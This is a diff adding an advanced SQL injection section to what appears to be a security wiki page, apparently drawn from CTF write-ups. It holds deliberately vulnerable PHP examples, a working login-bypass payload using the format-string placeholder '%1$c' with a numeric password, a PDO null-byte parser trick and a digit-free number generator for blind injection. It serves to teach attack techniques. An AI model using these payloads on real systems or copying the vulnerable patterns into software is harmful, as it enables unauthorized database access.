@@ -132,3 +132,138 @@ The CLI also includes an extra special function used for editing data interactiv
 sh: 1: temp9385525e2ea5301f: not found
 Error: EDITOR returned non-zero
 </code></pre>
+
+## Advanced
+
+### Format strings
+
+Even when the code you're looking at seems to be **correctly separating the SQL query from data** by using different arguments and placeholders, the underlying function may be insecurely turning both into a **single string** before it's sent to the database.
+
+One thing that sometimes goes wrong is the ability to **inject placeholders** yourself in your values. An example of this can be found in the article below, where the code would iterate over all values, replacing them one by one. If your value contained a new placeholder the 2nd value would go into there instead by mistake. This confusion was enough to create an exploitable SQL Injection:
+
+{% embed url="https://blog.lexfo.fr/magento-sqli.html" %}
+Explaining example of a placeholder injection SQL Injection vulnerability (PHP)
+{% endembed %}
+
+When the developer uses an insecure combination of manual string concatenation and lets the library for format strings over that, you can once again inject placeholders (like `%s`) into the query.
+
+{% code title="Vulnerable example" %}
+```php
+$username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
+$res = mysql_fquery($mysqli,
+    'SELECT * FROM users WHERE username = "' . $username . '" AND password = "%s"',
+    [$password]
+);
+```
+{% endcode %}
+
+&#x20;If the code relies on escaping/removing certain character like `'` to prevent SQL Injections, more complex placeholders like `%c` can turn a number (or a string casted to a number) into a single character through giving it a value with the 2nd input.\
+To fix the issue of the format function receiving more placeholders than values, we can make our injected placeholder point to the 1st value specifically so it doesn't increase the total count, using `%1$c`.
+
+* `username`: `%1$c OR 1=1;-- -`
+* `password`: `34`
+
+Together, this will turn into the following format string:
+
+```php
+$res = mysql_fquery($mysqli,
+    'SELECT * FROM users WHERE username = "%1$c OR 1=1;-- -" AND password = "%s"',
+    ["34"]
+);
+```
+
+The `password` value (inside the array) needs to be placed into the format string. `%1$c` is replaced with the 1st element of the array, which is our `"34"` string, but because of the `c` is converted to a _character_ from an ASCII number. The 34th character is `"`, which is what it will be replaced with. The last `%s` also get substituted, and because the other format specifier was specific, this will be the first generic one and also take the 1st element of the array (our password).
+
+```sql
+SELECT * FROM users WHERE username = "" OR 1=1;-- -" AND password = "34"
+```
+
+{% embed url="https://www.justinsteven.com/posts/2023/09/10/ductf-2023-smooth-jazz-sqli/" %}
+Writeup of the challenge using a novel technique of format strings in PHP
+{% endembed %}
+
+This same challenge includes another trick specific to MySQL, **truncating** the input in a SQL query using bytes outside of the ASCII range (0x80-0xff). It can be useful if your injection gets in the way in some other previous query, or in general if there's just a suffix you want to get rid of, when inserting or updating a value.
+
+### PDO parser differentials (PHP)
+
+In a similar situation to the previous, when you combine manual string concatenation with placeholders it can create scenario's where you can inject your own placeholders (like `?`).
+
+{% code title="Vulnerable example" %}
+```php
+$pdo = new PDO("mysql:host=127.0.0.1;dbname=demo", 'root', '');
+
+$col = '`' . str_replace('`', '``', $_GET['col']) . '`';
+
+$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
+$stmt->execute([$_GET['name']]);
+```
+{% endcode %}
+
+This alone is not enough to inject arbitrary statements, where the novelty comes in is using the fact that PDO specifically parses the query to find which placeholders are and aren't real, and in which context they are to put the values in. Because what you may not expect is that this `prepare()` method does **not actually use prepared statements** by default!
+
+The writeup below shows a challenge where the solution involved finding a parser bug where a null byte (`%00`) was not recognized and could break the syntax. Check it out to understand in detail:
+
+{% embed url="https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/" %}
+Article introducing the technique and its details with examples
+{% endembed %}
+
+### Numbers without digits
+
+Often with Blind SQL Injection you want to compare characters in a string to numbers using Binary Search to hone in on the value. In rare situations, however, you may not have the luxury of writing numbers. In these cases you can make use of the automatic casting of _booleans_ to numbers when adding or multiplying them.
+
+`true` = 1, and `false` = 0. By adding true to itself `n` times, you get the number `n`, like `(true + true + true)` = 3. This gets repetitive for larger numbers, however, so we can do better by cleverly multiplying to get there.
+
+An implementation of a dynamic programming algorithm is given below to find the most efficient expressions that evaluate to your target number:
+
+<pre class="language-python"><code class="lang-python">def find_expressions(limit):
+    """Source: https://chat.openai.com/share/2eb7a5cd-0980-4734-b897-acaf8e546969"""
+    if limit == 0:
+        return "false"
+    if limit == 1:
+        return "true"
+
+    # Initialize a list to store the number of operations needed to reach each target
+    min_operations = [float('inf')] * (limit + 1)
+    min_operations[1] = 0  # Base case
+
+    # Initialize a list to store the expression for each target
+    expressions = ["false"] * (limit + 1)
+    expressions[1] = "true"
+
+    # Iterate through each number from 2 to target
+    for i in range(2, limit + 1):
+        # Try addition
+        for j in range(1, i):
+            if min_operations[j] + min_operations[i - j] + 1 &#x3C; min_operations[i]:
+                min_operations[i] = min_operations[j] + \
+                    min_operations[i - j] + 1
+                expressions[i] = "(" + expressions[j] + \
+                    "+" + expressions[i - j] + ")"
+
+        # Try multiplication
+        for j in range(2, int(i ** 0.5) + 1):
+            if i % j == 0:
+                if min_operations[j] + min_operations[i // j] + 1 &#x3C; min_operations[i]:
+                    min_operations[i] = min_operations[j] + \
+                        min_operations[i // j] + 1
+                    expressions[i] = "(" + expressions[j] + \
+                        "*" + expressions[i // j] + ")"
+
+    return expressions
+
+if __name__ == "__main__":
+<strong>    expressions = find_expressions(256)
+</strong><strong>    for c in 'Jorian':
+</strong><strong>        print(f"{c} ({ord(c)}): {expressions[ord(c)]}")
+</strong></code></pre>
+
+{% code title="Example output" %}
+```sql
+J (74): ((true+true)*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
+o (111): ((true+(true+true))*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
+r (114): ((true+true)*((true+(true+true))*(true+((true+true)*((true+(true+true))*(true+(true+true)))))))
+i (105): ((true+(true+true))*((true+(true+(true+(true+true))))*(true+((true+true)*(true+(true+true))))))
+a (97): (true+((true+true)*((true+true)*((true+true)*((true+true)*((true+true)*(true+(true+true))))))))
+n (110): ((true+true)*(true+((true+true)*((true+(true+true))*((true+(true+true))*(true+(true+true)))))))
+```
+{% endcode %}
